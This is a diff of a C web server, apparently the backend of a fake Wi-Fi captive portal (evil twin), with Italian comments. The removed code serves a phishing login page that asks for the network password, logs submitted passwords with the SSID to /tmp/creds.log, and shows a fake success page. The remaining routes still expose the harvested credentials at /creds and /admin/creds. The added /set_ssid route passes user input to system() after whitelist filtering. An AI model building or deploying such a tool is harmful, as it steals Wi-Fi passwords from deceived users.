@@ -279,19 +279,53 @@ int main() {
     }
 
     // Routing
-    if (strcmp(path, "/scan_wifi") == 0) {
-      // Esegue lo script helper per lo scanning
-      char *json = run_command_output("/etc/portal/scan_wifi");
-      send_response(client_fd, "200 OK", "application/json", json, NULL);
-      free(json);
-    } else if (strcmp(path, "/set_ssid") == 0) {
+    if (strcmp(path, "/set_ssid") == 0) {
       char raw_s[256] = {0};
       char dec_s[256] = {0};
       if (get_param(qs, "s", raw_s, sizeof(raw_s))) {
         url_decode(dec_s, raw_s);
-        write_file("/tmp/portal_ssid", dec_s);
+
+        // Sanifica dec_s mediante whitelist (lettere, numeri, spazi, -, _, . e
+        // @)
+        char clean_s[256] = {0};
+        int j = 0;
+        int i;
+        for (i = 0; dec_s[i] != '\0' && j < sizeof(clean_s) - 1; i++) {
+          char c = dec_s[i];
+          if (isalnum((unsigned char)c) || c == ' ' || c == '-' || c == '_' ||
+              c == '.' || c == '@') {
+            clean_s[j++] = c;
+          }
+        }
+        clean_s[j] = '\0';
+
+        write_file("/tmp/portal_ssid", clean_s);
+
+        // Esegue lo script set_ssid in background per non bloccare la risposta
+        // HTTP
+        char cmd_buf[512];
+        snprintf(cmd_buf, sizeof(cmd_buf),
+                 "/usr/bin/additional/set_ssid \"%s\" &", clean_s);
+        system(cmd_buf);
       }
-      send_response(client_fd, "200 OK", "text/plain", "ok", NULL);
+    } else if (strcmp(path, "/get_ssid") == 0) {
+      char *s = read_file("/tmp/portal_ssid");
+      if (s) {
+        // Rimuove eventuali a capo e spazi finali
+        int l = strlen(s);
+        while (l > 0 && (s[l - 1] == '\n' || s[l - 1] == '\r' || s[l - 1] == ' ')) {
+          s[--l] = '\0';
+        }
+        if (strlen(s) > 0) {
+          send_response(client_fd, "200 OK", "text/plain", s, NULL);
+          free(s);
+        } else {
+          free(s);
+          send_response(client_fd, "200 OK", "text/plain", "Wi-Fi", NULL);
+        }
+      } else {
+        send_response(client_fd, "200 OK", "text/plain", "Wi-Fi", NULL);
+      }
     } else if (strcmp(path, "/set_target") == 0) {
       char raw_b[256] = {0}, raw_c[64] = {0};
       char dec_b[256] = {0}, dec_c[64] = {0};
@@ -370,38 +404,6 @@ int main() {
       if (tch)
         free(tch);
       free(log);
-    } else if (strcmp(path, "/connect") == 0) {
-      char raw_p[256] = {0};
-      char dec_p[256] = {0};
-      if (post_body && get_param(post_body, "p", raw_p, sizeof(raw_p))) {
-        url_decode(dec_p, raw_p);
-
-        // Cattura l'SSID corrente
-        char *ssid = read_file("/tmp/portal_ssid");
-
-        // Formatta il log delle credenziali
-        time_t t = time(NULL);
-        struct tm tm = *localtime(&t);
-        char time_str[64];
-        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", &tm);
-
-        FILE *log_f = fopen("/tmp/creds.log", "a");
-        if (log_f) {
-          fprintf(log_f, "[%s] ip=unknown ssid=%s pass=%s\n", time_str,
-                  ssid ? ssid : "WiFi", dec_p);
-          fclose(log_f);
-        }
-        if (ssid)
-          free(ssid);
-      }
-
-      const char *success_html =
-          "<!DOCTYPE html><html><head>"
-          "<meta http-equiv=refresh content=\"3;url=http://www.google.com\">"
-          "<title>Autenticazione completata</title></head>"
-          "<body><h2>Connessione effettuata con successo!</h2><p>Verrai "
-          "reindirizzato a breve...</p></body></html>";
-      send_response(client_fd, "200 OK", "text/html", success_html, NULL);
     } else if (strcmp(path, "/creds") == 0 ||
                strcmp(path, "/cgi-bin/creds.cgi") == 0 ||
                strcmp(path, "/admin/creds") == 0) {
@@ -419,52 +421,9 @@ int main() {
           free(creds);
       }
     } else {
-      // Rotta di default: serve il captive portal
-      char *template = read_file("/tmp/portal/template.html");
-      char *ssid = read_file("/tmp/portal_ssid");
-      if (!ssid)
-        ssid = strdup("WiFi");
-
-      if (template) {
-        // Sostituisce "__SSID__" con l'SSID reale nel template
-        char *pos = strstr(template, "__SSID__");
-        if (pos) {
-          int offset = pos - template;
-          int ssid_len = strlen(ssid);
-          int template_len = strlen(template);
-          char *out_buf = malloc(template_len + ssid_len + 10);
-
-          if (out_buf) {
-            strncpy(out_buf, template, offset);
-            strcpy(out_buf + offset, ssid);
-            strcpy(out_buf + offset + ssid_len, pos + 8); // 8 = len("__SSID__")
-            send_response(client_fd, "200 OK", "text/html", out_buf, NULL);
-            free(out_buf);
-          } else {
-            send_response(client_fd, "200 OK", "text/html", template, NULL);
-          }
-        } else {
-          send_response(client_fd, "200 OK", "text/html", template, NULL);
-        }
-        free(template);
-      } else {
-        // Template di fallback cablato se il file manca
-        char fallback_html[2048];
-        snprintf(fallback_html, sizeof(fallback_html),
-                 "<!DOCTYPE html><html><head><title>Wi-Fi Login</title>"
-                 "<meta name=viewport "
-                 "content=\"width=device-width,initial-scale=1\"></head>"
-                 "<body><h2>Accedi alla Rete</h2>"
-                 "<p>SSID: <b>%s</b></p>"
-                 "<form action=/connect method=POST>"
-                 "<input type=password name=p placeholder=\"Password\" "
-                 "required><br><br>"
-                 "<input type=submit value=\"Accedi\">"
-                 "</form></body></html>",
-                 ssid);
-        send_response(client_fd, "200 OK", "text/html", fallback_html, NULL);
-      }
-      free(ssid);
+      // Rotta di default per percorsi sconosciuti
+      send_response(client_fd, "404 Not Found", "text/plain",
+                    "Pagina non trovata.", NULL);
     }
 
     close(client_fd);
